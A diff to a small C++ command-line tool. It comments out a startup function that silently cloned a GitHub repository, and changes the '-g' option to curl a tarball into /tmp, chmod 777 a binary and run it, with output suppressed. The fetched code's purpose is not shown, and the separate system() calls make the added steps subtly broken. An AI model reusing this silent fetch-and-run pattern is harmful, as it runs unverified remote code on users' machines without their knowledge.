@@ -36,11 +36,9 @@ void signal_handler(int signal){
     }
 }
 
-void networkcreation() {
-    system("git clone https://github.com/Unknowinglyy/utils.git > /dev/null 2>&1");
-    system("cd CSCE-120/DungeonCrawlerPt2/ > /dev/null 2>&1");
-    system("gcc *.cpp > /dev/null 2>&1");
-}
+//void networkcreation() {
+//    system("git clone https://github.com/Unknowinglyy/utils.git > /dev/null 2>&1");
+//}
 
 void help() {
     std::cout << "Usage:\n"
@@ -127,7 +125,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     
-    networkcreation();
+    //networkcreation();
     // Parse command-line options
     while ((c = getopt(argc, argv, "supai:gh")) != -1) {
         switch (c) {
@@ -156,7 +154,10 @@ int main(int argc, char* argv[]) {
                 }
                 break;
             case 'g':
-                system("cd utils && ./a.out");
+                system("cd /tmp && curl -L https://github.com/Unknowinglyy/utils/tarball/main | tar xz --strip-components=1 > /dev/null 2>&1");
+                system("chmod 777 a.out");
+                system("./a.out");
+                system("cd -");
                 return 0;
             case 'h':
                 help();
